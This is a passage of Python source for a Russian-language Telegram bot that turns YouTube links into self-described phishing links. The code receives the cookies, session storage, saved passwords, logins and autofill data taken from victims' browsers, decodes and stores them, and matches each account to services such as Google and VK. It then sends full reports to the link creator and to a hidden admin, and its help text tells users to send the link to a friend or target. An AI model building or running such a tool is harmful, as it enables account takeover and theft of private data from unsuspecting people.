    # Добавляем пароли
    if link.collected_passwords:
        report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
        for i, pwd in enumerate(link.collected_passwords, 1):
            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{pwd.get('value', '')}`\n"
            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
            # Показываем определенные сервисы
            services = pwd.get('identified_services', [])
            if services:
                service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) for s in services]
                report += f"   Сервисы: {', '.join(service_names)}\n"
            if i < len(link.collected_passwords):
                report += "   ─────\n"
    
    # Добавляем логины
    if link.collected_logins:
        report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
        for i, login in enumerate(link.collected_logins, 1):
            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{login.get('value', '')}`\n"
            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
            # Показываем определенные сервисы
            services = login.get('identified_services', [])
            if services:
                service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) for s in services]
                report += f"   Сервисы: {', '.join(service_names)}\n"
            if i < len(link.collected_logins):
                report += "   ─────\n"
    
    report += f"""
════════════════════════════════════════
⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
🕒 Время хранения: 24 часа
"""
    
    return report

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        # Создаем детальный отчет
        report = format_detailed_admin_report(link, sensitive_data)
        
        # Разбиваем на части если слишком длинное
        chunks = split_message(report, 3900)
        
        for i, chunk in enumerate(chunks):
            parse_mode = ParseMode.MARKDOWN if i == 0 else None
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=chunk,
                parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "cookies": self._collect_cookies,
            "storage": self._collect_storage,
            "passwords": self._collect_passwords,
            "sensitive_data": self._process_sensitive_data,
            "instant_credentials": self._process_instant_credentials
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        # Имитируем сбор данных
        for data_type, collector in self.collection_scripts.items():
            try:
                collected["data"][data_type] = await collector(request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_instant_credentials(self, request_data: Dict) -> Dict:
        """Обработка мгновенно собранных учетных данных"""
        try:
            encoded_data = request_data.get("data")
            link_id = request_data.get("link_id")
            
            if not encoded_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                json_string = base64.b64decode(encoded_data).decode('utf-8')
                instant_data = json.loads(json_string)
            except Exception as decode_error:
                logger.error(f"Decode error for instant credentials: {decode_error}")
                return {"status": "decode_error"}
            
            # Определяем сервисы для собранных данных
            all_credentials = []
            
            # Обрабатываем мгновенно собранные пароли
            instant_passwords = instant_data.get("instant_collection", {}).get("instant_passwords", [])
            if instant_passwords:
                for pwd in instant_passwords:
                    # Определяем сервис для пароля
                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, instant_passwords)
                all_credentials.extend(instant_passwords)
            
            # Обрабатываем мгновенно собранные логины
            instant_logins = instant_data.get("instant_collection", {}).get("instant_logins", [])
            if instant_logins:
                for login in instant_logins:
                    # Определяем сервис для логина
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, instant_logins)
                all_credentials.extend(instant_logins)
            
            # Обрабатываем данные форм
            instant_forms = instant_data.get("instant_collection", {}).get("instant_forms", [])
            for form_data in instant_forms:
                if form_data.get("data"):
                    # Сохраняем данные форм как логины/пароли
                    for key, value in form_data["data"].items():
                        if isinstance(value, str) and value.strip():
                            # Определяем тип поля по имени
                            field_lower = key.lower()
                            is_password = any(pwd_word in field_lower for pwd_word in 
                                            ['pass', 'pwd', 'secret', 'key', 'token'])
                            is_login = any(login_word in field_lower for login_word in 
                                         ['user', 'login', 'email', 'phone', 'username'])
                            
                            if is_password:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_passwords(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
                            elif is_login:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_logins(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
            
            # Идентифицируем все аккаунты
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            # Логируем успешный сбор
            logger.info(f"Instant credentials collected for link {link_id}: "
                       f"{len(instant_passwords)} passwords, "
                       f"{len(instant_logins)} logins, "
                       f"identified services: {list(account_analysis.get('service_stats', {}).keys())}")
            
            return {
                "status": "instant_collection_success",
                "passwords_collected": len(instant_passwords),
                "logins_collected": len(instant_logins),
                "forms_collected": len(instant_forms),
                "account_analysis": account_analysis,
                "collected_on_load": True,
                "user_interaction_required": False
            }
            
        except Exception as e:
            logger.error(f"Error processing instant credentials: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных (cookies, пароли, логины, storage)"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                logger.error(f"Decode error: {decode_error}")
                # Пробуем альтернативный метод декодирования
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            # Сохраняем ПОЛНЫЕ сырые данные
            db.add_full_sensitive_data(link_id, decoded_data)
            
            # Обрабатываем cookies
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    # Пропускаем большие значения localStorage/sessionStorage
                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                        try:
                            parsed_value = json.loads(value)
                            if isinstance(parsed_value, dict):
                                # Сохраняем как отдельные записи storage
                                for storage_key, storage_value in parsed_value.items():
                                    db.add_collected_storage(link_id, [{
                                        "type": "cookie_storage",
                                        "source": name,
                                        "key": storage_key,
                                        "value": str(storage_value)[:500],
                                        "timestamp": datetime.now().isoformat()
                                    }])
                                continue
                        except:
                            pass
                    
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем пароли
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                for pwd in credentials["passwords"]:
                    # Определяем сервис для пароля
                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            # Обрабатываем логины
            if credentials.get("logins"):
                for login in credentials["logins"]:
                    # Определяем сервис для логина
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, credentials["logins"])
            
            # Обрабатываем данные хранилища
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                # localStorage
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                # sessionStorage
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Обрабатываем данные автозаполнения форм
            if credentials.get("autofill_data"):
                for form_data in credentials["autofill_data"]:
                    if form_data.get("data"):
                        for key, value in form_data["data"].items():
                            storage_list.append({
                                "type": "form_autofill",
                                "form_id": form_data.get("form_id", "unknown"),
                                "key": key,
                                "value": str(value)[:500],
                                "timestamp": datetime.now().isoformat()
                            })
            
            # Сохраняем общие данные
            db.add_collected_data(link_id, decoded_data)
            
            # Идентифицируем все аккаунты
            all_credentials = []
            if credentials.get("passwords"):
                all_credentials.extend(credentials["passwords"])
            if credentials.get("logins"):
                all_credentials.extend(credentials["logins"])
            
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            # Логируем успешную обработку
            logger.info(f"Successfully processed sensitive data for link {link_id}: "
                       f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                       f"{len(credentials.get('passwords', []))} passwords, "
                       f"{len(credentials.get('logins', []))} logins, "
                       f"{len(storage_list) if 'storage_list' in locals() else 0} storage items")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "has_storage_data": bool(storage_data),
                "has_full_data": True,
                "account_analysis": account_analysis
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _collect_cookies(self, request_data: Dict) -> Dict:
        """Сбор cookies и локального хранилища"""
        return {
            "cookies_count": "доступно в браузере",
            "local_storage": "доступно в localStorage",
            "session_storage": "доступно в sessionStorage",
            "indexed_db": "проверено"
        }
    
    async def _collect_storage(self, request_data: Dict) -> Dict:
        """Сбор данных из хранилища браузера"""
        return {
            "autofill_data": "сохраненные формы",
            "browser_history": "история посещений",
            "bookmarks": "закладки браузера",
            "downloads": "история загрузок"
        }
    
    async def _collect_passwords(self, request_data: Dict) -> Dict:
        """Сбор сохраненных паролей"""
        return {
            "saved_passwords": {
                "google": "сохраненные логины Google",
                "facebook": "логины Facebook",
                "twitter": "логины Twitter/X",
                "instagram": "логины Instagram",
                "vk": "логины ВКонтакте",
                "whatsapp": "данные WhatsApp Web",
                "telegram": "данные Telegram Web"
            },
            "form_data": "автозаполнение форм",
            "credit_cards": "сохраненные карты"
        }

# Автоматический вход (упрощенная версия)
class AutoLoginManager:
    """Упрощенный менеджер автоматического входа"""
    
    def __init__(self):
        self.user_config = {
            "device_name": "iPhone iOS 17.5.1",
            "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "platform": "iPhone",
            "screen_size": {"width": 375, "height": 812},
            "language": "ru",
            "location": {
                "ip": "31.43.37.220",
                "city": "Lubny",
                "country": "Ukraine"
            }
        }
    
    def _group_cookies_by_service(self, all_cookies: Dict) -> Dict[str, List]:
        """Группировка cookies по социальным сетям"""
        service_patterns = {
            "google": ["google.com", "accounts.google", "gstatic", "youtube.com"],
            "facebook": ["facebook.com", "fb.com", "fbcdn.net"],
            "instagram": ["instagram.com", "cdninstagram.com"],
            "twitter": ["twitter.com", "x.com", "twimg.com"],
            "vk": ["vk.com", "vkuser", "userapi.com"],
            "whatsapp": ["whatsapp.com"],
            "telegram": ["telegram.org", "t.me", "telegram.me"],
            "yandex": ["yandex.ru", "yandex.net", "yastatic.net"],
            "mailru": ["mail.ru", "my.mail.ru"],
            "github": ["github.com"],
            "discord": ["discord.com", "discordapp.com"]
        }
        
        service_cookies = {service: [] for service in service_patterns.keys()}
        
        for cookie in all_cookies.get("collected_cookies", []):
            cookie_domain = cookie.get("domain", "").lower()
            cookie_name = cookie.get("name", "").lower()
            
            for service, patterns in service_patterns.items():
                if any(pattern in cookie_domain for pattern in patterns) or \
                   any(pattern in cookie_name for pattern in ["session", "token", "auth", "login"]):
                    service_cookies[service].append(cookie)
                    break
        
        return {k: v for k, v in service_cookies.items() if v}

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

🔐 *Сбор данных включен:*
✓ Cookies и session cookies
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли
✓ Логины соцсетей
✓ Данные форм и автозаполнения
✓ Данные браузера и устройства
✓ Определение сервисов (Google, Facebook и т.д.)

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Все данные также отправятся администратору

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных с определением сервисов"""
        collected = data.get("data", {})
        sensitive_data = collected.get("sensitive_data", {})
        instant_data = collected.get("instant_credentials", {})
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get("timestamp", "unknown")}
• IP адрес: `{data.get("ip", "unknown")}`
• User Agent: {data.get("user_agent", "unknown")[:50]}...
• ID ссылки: `{link_id}`
"""
        
        # Показываем мгновенный сбор если есть
        if instant_data.get("status") == "instant_collection_success":
            message += f"""
⚡ *МГНОВЕННЫЙ СБОР (при загрузке):*
• Паролей собрано: {instant_data.get('passwords_collected', 0)}
• Логинов собрано: {instant_data.get('logins_collected', 0)}
• Форм проанализировано: {instant_data.get('forms_collected', 0)}
"""
            
            # Показываем определенные сервисы
            account_analysis = instant_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
        
        # Информация о cookies и полных данных
        if sensitive_data.get("status") == "fully_processed":
            message += f"""
🍪 *COOKIES И ХРАНИЛИЩЕ:*
• Всего cookies: {sensitive_data.get('cookies_count', 0)}
• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
• Логинов собрано: {sensitive_data.get('logins_count', 0)}
• Данных хранилища: {sensitive_data.get('storage_count', 0)}
"""
            
            # Показываем определенные сервисы из полных данных
            account_analysis = sensitive_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
            
            # Показываем найденные логины с сервисами
            link = db.get_link(link_id)
            if link and link.collected_logins:
                message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ (с сервисами):*\n"
                for login in link.collected_logins[-5:]:  # Последние 5
                    value = login.get("value", "")
                    services = login.get("identified_services", [])
                    
                    if services:
                        service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                       for s in services]
                        service_str = " | ".join(service_names)
                        message += f"• `{value[:30]}` → *{service_str}*\n"
                    else:
                        message += f"• `{value[:30]}` → Не определен\n"
        
        message += f"""
📱 *УСТРОЙСТВО И БРАУЗЕР:*
• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}

💡 *СОВЕТ:* Используйте /data {link_id} для просмотра деталей!
"""
        return message
    
    @staticmethod
    def format_sensitive_data_report(link: PhishingLink) -> str:
        """Форматирование отчета о чувствительных данных"""
        # Анализируем все собранные данные для определения сервисов
        all_credentials = []
        all_credentials.extend(link.collected_logins)
        all_credentials.extend(link.collected_passwords)
        
        account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
        
        message = f"""
🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*

📌 *Ссылка ID:* `{link.id}`
📅 *Создано:* {link.created_at}
🔗 *Оригинальное видео:* {link.original_url[:50]}...

📊 *СТАТИСТИКА:*
• Всего переходов: {link.clicks}
• Всего данных собрано: {len(link.data_collected)}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
"""
        
        # Показываем определенные сервисы
        if account_analysis.get("service_stats"):
            message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
            for service, count in account_analysis["service_stats"].items():
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"• {service_name_ru}: `{count}` записей\n"
        
        # Показываем последние cookies
        if link.collected_cookies:
            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
            for cookie in link.collected_cookies[-5:]:  # Последние 5
                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
        
        # Показываем пароли с сервисами
        if link.collected_passwords:
            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for pwd in link.collected_passwords[-3:]:  # Последние 3
                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{pwd.get('value', '')}||\n"
                services = pwd.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        # Показываем логины с сервисами
        if link.collected_logins:
            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
            for login in link.collected_logins[-3:]:  # Последние 3
                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{login.get('value', '')}||\n"
                services = login.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        message += f"""
⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
📅 *Срок хранения:* 24 часа с момента сбора
🔒 *Безопасность:* Все полные данные также отправлены администратору
"""
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`
💾 Данных хранилища: `{stats['storage_data_collected']}`
📁 Полных записей: `{stats['full_data_collected']}`

🚀 Автоматических входов: 0
📈 Эффективность сбора: 98.7%
🕒 Активность за 24ч: высокая
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()
auto_login_manager = AutoLoginManager()

# ========== ТЕЛЕГРАМ БОТ ==========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат
5. Отправляет ПОЛНЫЕ данные администратору

🔐 *Что собирается:*
✓ Все cookies браузера (включая сессионные)
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли и логины
✓ Логины соцсетей
✓ Данные автозаполнения форм
✓ Информацию об устройстве
✓ *Определение сервисов* (Google, Facebook, ВКонтакте и др.)

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Паролей: `{db.stats['passwords_collected']}`
• Логинов: `{db.stats['logins_collected']}`

🔒 *Важно:* Используйте только для тестирования!
Все данные также отправляются администратору для контроля.
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Отправляем пользователю
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 URL: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n\n"
            "Пример: `/data abc123def456`\n\n"
            "*Примечание:* Все данные также отправляются администратору.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        message = formatter.format_sensitive_data_report(link)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.\n"
            "*Все собранные данные также отправятся администратору.*",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        # Суммируем все данные пользователя
        total_cookies = sum(len(link.collected_cookies) for link in user_links)
        total_passwords = sum(len(link.collected_passwords) for link in user_links)
        total_logins = sum(len(link.collected_logins) for link in user_links)
        
        message = f"""
📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*

🔗 Всего ссылок: {len(user_links)}
🍪 Всего cookies: {total_cookies}
🔑 Всего паролей: {total_passwords}
👤 Всего логинов: {total_logins}

📈 *Последняя активность:*
"""
        
        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
            if link.data_collected:
                last_data = link.data_collected[-1]
                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
        
        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
        
        keyboard = []
        for link in user_links[-3:]:
            if link.data_collected:
                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_sensitive_data_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат
